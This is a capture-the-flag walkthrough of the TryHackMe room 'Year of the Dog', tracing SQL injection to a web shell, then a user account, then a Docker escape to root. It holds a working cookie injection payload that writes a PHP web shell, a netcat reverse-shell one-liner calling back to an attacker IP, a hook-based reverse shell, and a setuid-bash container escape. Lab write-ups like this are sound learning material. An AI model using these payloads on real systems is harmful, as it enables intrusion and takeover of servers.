# Year of the Dog

https://tryhackme.com/room/yearofthedog

A hard room that required *a lot* of enumeration before I figured it out, including a few dead ends.

## Getting a shell

- A scan revealed only `22` and `80`
- On `80`, a page with no interaction that told me I was in a queue. A cookie was being set - clearing it randomly assigned me a new cookie and a new position in the queue
- The cookie value, if changed to `id='` triggered a mysql error. Via this, I discovered it was a server with one database, webapp, containing one table queue with two columns `userId` and `queueNum`. There seemed to be some primitive 'RCE protection in place' - certain queries would throw an error.
- I discovered that lowercase load_file and dumpfile worked (uppercase versions triggered the RCE error) - I extracted `/etc/passwd` this way, seeing there was a user named dylan
- Via this vuln, I got the `config.php` file (guessing correctly it was at `/var/www/html` and loading it into a text file in the same directory that I could access) and `index.php`
- `config.php` gave me the db creds. With `index.php` I could see that in addition to the banned words, `<` and `>` was blocked making PHP injection difficult. 
- however, I was able to get a primitive web shell via: `Cookie: id='+UNION+ALL+SELECT+'',concat(char(60),'?php+echo+shell_exec($_GET["e"])+?',char(62))+INTO+dumpfile+'/var/www/html/shell.php'+--+`, abusing MySql's `char` command to get around the `<`/`>` limits.
- the following got me a reverse shell: `/shell.php?e=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.154.104+4444+>/tmp/f`. this was then stabilised and improved with `python3 -c 'import pty; pty.spawn("/bin/bash")'` and then `export TERM=xterm`, Ctrl + Z, `stty raw -echo; fg`

## Getting user

- on the box as `www-data`, I discovered `dylan` was running an instance of gitea (a self contained git server, like gitlab or github) on port `3000`. not accessible from the outside, however, via  `ssh -N -R 3000:localhost:3000 root@10.10.154.104` I could get access to it on my attack machine (Note, while fine here, running a root ssh session on a target machine is NOT a good idea - creds could be nicked, session hijacked anything).
- enumerating this for *hours* got me nowhere. eventually, i went back over the machine with `linpeas.sh` and checked over a file I had seen earlier: `work_analysis`, plain ascii, in dylan's home dir. I had checked this before, seen it as a list of sshd failures with nothing of note. on the second check, huge facepalm, I found it had an entry for a failed login that was obviously the user dylan typing his password as his username. trying this I was able to `su` as dylan.

## Getting root

This was complex. Dylan owned all the files in /gitea, so I figured it was something to do with that.

- i tried to find the gitea executable via `find / -name gitea -type f 2>/dev/null`. I couldn't find it, but i did find git hook config files for each repo
- i had already created a test repo, and it had a file here: `/gitea/git/repositories/dylan/test-repo.git/hooks/update.d/gitea`, the contents of which looked like a standard bash file
- i appended a reverse shell call and then updated the repo. I got a call back! as user `git`
- git had rights to sudo as everything, so I elevated to root and done... right?
- quickly realised I was in a docker container on the main machine, and so no. also, it wasn't a privileged container.
- HOWEVER, the /data/gitea folder inside the container was mapped to /gitea/gitea on the host and they hadn't enabled user remapping in docker! documented here, https://docs.docker.com/engine/security/userns-remap/, in brief, it stops root inside the container from ALSO being effectively root on the host.
- so the final exploit was to copy bash into that mapped folder, use the container root to invoke `chown root bash` and `chmod u+s bash` then invoke it from outside as dylan via `./bash -p`. Boom, root

Very fun, very long. Spent around four hours on this - mostly trying to get various gitea exploits to run. That reverse port forward was ultimately unnecessary, but worth learning for the future.
